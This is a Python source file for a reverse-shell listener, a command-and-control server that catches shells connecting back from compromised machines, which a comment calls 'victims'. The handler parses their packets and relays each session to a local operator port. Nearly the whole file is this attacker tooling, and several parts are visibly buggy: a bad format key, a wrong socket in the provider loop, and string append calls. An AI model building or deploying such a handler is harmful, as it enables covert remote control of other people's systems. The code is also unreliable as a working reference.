import json
import random
import select
import socket
import struct
import threading
from datetime import datetime as dt

T_JSON = 0
T_DICT = 1


class ReverseShell(threading.Thread):
    # a random string
    SHELL_HELLO = ''.join([chr(int(x, 16)) for x in
                           "21 9e 10 55 75 6a 1a 6b".split()]).encode()

    def __init__(self, sock, key=None):
        super(ReverseShell, self).__init__()
        self.details = {
            "id": '%x' % random.randrange(16**8)
        }
        self.rsock = sock  # the remote socket connected to the victim
        self.lsock = None  # the local socket for shell interaction
        self.key = key
        self.get_shell_hello()
        host, port = sock.getpeername()
        self.details["peer_host"] = host
        self.details["peer_port"] = port
        self.description = "[%(id)s] %(user)s@%(hostname)s " + \
                           "(%(peer_host)s:%(peer_id)d)" % self.details
        self.log = []
        self.read_socks = [self.rsock]
        self.write_socks = []
        self.queue = {
            self.rsock: []
        }
        self.active = True
        self.run()

    def set_lsock(self, sock):
        #  if not self.lsock:
        #      raise Exception  # already occupied
        self.lsock = sock
        self.read_socks = [self.rsock, self.lsock]
        self.queue[self.lsock] = []
        self.deliver_backlog()

    def unset_lsock(self):
        self.queue.pop(self.lsock)
        self.read_socks.remove(self.lsock)
        self.write_socks.remove(self.lsock)
        self.lsock = None

    def get_shell_hello(self):
        r, _, _ = select.select([self.rsock], [], [])
        firstbytes = r[0].recv(8, socket.MSG_PEEK)
        if firstbytes == self.SHELL_HELLO:  # or rc4(shell_hello) TODO
            r.recv(8)
            p = self.read_shell_packet(self.rsock)
            self.shell_type = 'smart'
            self.details = p["data"]
        else:
            self.shell_type = 'dumb'
            for key in ["user", "host", "ps_version", "arch"]:
                self.details[key] = '?'

    def write_shell_packet(self, p, s):
        """Convert a ShellPacket to a byte string and send it across the
        wire"""

        s.write(p.serialize())
        p.set_delivered()
        self.queue[s].remove(p)

    def read_shell_packet(self, s):
        """Deserialize byte string and instantiate ShellPacket"""
        header = s.recv(6)
        packet_type, packet_length = struct.unpack('>HI', header)
        body = s.recv(packet_length)
        p = ShellPacket(packet_type, body)
        self.log.append(p)
        if s == self.rsock:
            self.t_sign_of_life = dt.now()
            if self.lsock:
                self.deliver(p, self.lsock)
        else:
            self.deliver(p, self.rsock)
        return p

    def deliver(self, packet, sock):
        """Puts a packet in the queue belonging to the socket it should be
        written to"""

        self.queue[sock].append(packet)
        self.write_socks.append(sock)

    def deliver_backlog(self):
        """Delivers packets which haven't been delivered yet to local
        socket"""

        backlog = [x for x in self.log if
                   not x.delivered
                   and not x["msg_type"] == "HEARTBEAT"]
        # heartbeats don't need to be delivered to local socket, they are
        # only for updating t_sign_of_life
        if backlog:
            for p in backlog:
                self.deliver(p, self.lsock)
        else:
            prompts = [x for x in self.log if x["msg_type"] == "PROMPT"]
            if prompts:
                self.deliver(prompts[-1], self.lsock)

    def get_log(self):
        """Return the entire log as a string"""

        result = ""
        for p in self.log:
            result.append(p.shell_string())
        return result

    def run(self):
        while self.active:
            r, w, _ = select.select(self.read_socks, self.write_socks, [], 60)
            for s in r:
                self.read_shell_packet(s)
            for s in w:
                for p in self.queue[s]:
                    self.write_shell_packet(p, s)
                w.remove(s)


class ShellPacket(object):
    class bcolors:
        VERBOSE = '\033[95m'
        WARNING = '\033[94m'
        ERROR = '\033[92m'
        DEBUG = '\033[93m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

    def __init__(self, packet_type, body):
        if packet_type == T_JSON:
            self.json = json.loads(body.decode())
        if packet_type == T_DICT:
            self.json = body
        else:
            raise Exception
        self.delivered = False

    def set_delivered(self):
        self.delivered = True

    #  def process_shell_packet(self):
    #      j = self.json
    #      if j["msg_type"] == "SHELL_HELLO":
    #          self.process_shell_hello(self.p)
    #      elif j["msg_type"] == "OUTPUT":
    #          self.process_output(self.p)
    #      elif j["msg_type"] in [
    #          "STREAM_INFORMATION",
    #          "STREAM_VERBOSE",
    #          "STREAM_WARNING",
    #          "STREAM_ERROR",
    #          "STREAM_PROGRESS",
    #          "STREAM_DEBUG",
    #      ]:
    #          self.process_output(self.p, streammsg_type=j["msg_type"])
    #      elif j["msg_type"] == "PROMPT":
    #          pass
    #      elif j["msg_type"] == "HEARTBEAT":
    #          # do nothing, is just for updating t_sign_of_life
    #          pass
    #      else:
    #          raise Exception

    def serialize(self):
        """Return a byte string of the ShellPacket"""

        buffer = json.dumps(self.json).decode()
        packet_length = len(buffer)
        packet_type = T_JSON
        header = struct.pack('>HI', packet_type, packet_length)
        return (header + buffer).encode()

    def __getitem__(self, key):
        return self.json[key]

    def shell_string(self):
        if self["msg_type"] in [
            "OUTPUT",
            "STREAM_INFORMATION",
        ]:
            return self["data"] + '\n'
        elif self["msg_type"] == "PROMPT":
            return self["data"]
        elif self["msg_type"] == "STREAM_VERBOSE":
            return "%s%s%s\n" % (
                self.bcolors.VERBOSE,
                self["data"],
                self.bcolors.ENDC,
            )
        elif self["msg_type"] == "STREAM_ERROR":
            return "%s%s%s\n" % (
                self.bcolors.ERROR,
                self["data"],
                self.bcolors.ENDC,
            )
        elif self["msg_type"] == "STREAM_WARNING":
            return "%s%s%s\n" % (
                self.bcolors.WARNING,
                self["data"],
                self.bcolors.ENDC,
            )
        elif self["msg_type"] == "STREAM_DEBUG":
            return "%s%s%s\n" % (
                self.bcolors.DEBUG,
                self["data"],
                self.bcolors.ENDC,
            )
        elif self["msg_type"] == "SHELL_HELLO":
            for key, val in self.json:
                return ("%s:\t%s\n" % key, val)
        else:
            return ""


class ShellReceiver(object):
    def __init__(self):
        self.rsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.rsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.shells = []

        self.lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run_receiver(self, host='0.0.0.0', port=3333):
        """Start listener for incoming reverse shells"""

        self.rsock.bind((host, port))
        self.rsock.listen(128)
        while True:
            connection, addr = self.rsock.accept()
            self.shells += ReverseShell(connection)

    def run_provider(self, host='127.0.0.1', port=18157):
        """Provides a service where you can interact with caught shells"""

        self.lsock.bind((host, port))
        self.lsock.listen(128)
        while True:
            connection, addr = self.rsock.accept()
            r, _, _ = select.select([connection], [], [])
            id = r.recv(8)
            peer_shell = [s for s in self.shells if s.details["id"] == id]
            if not peer_shell:
                raise Exception
            if len(peer_shell) > 1:
                raise Exception
            peer_shell[0].set_lsock(connection)
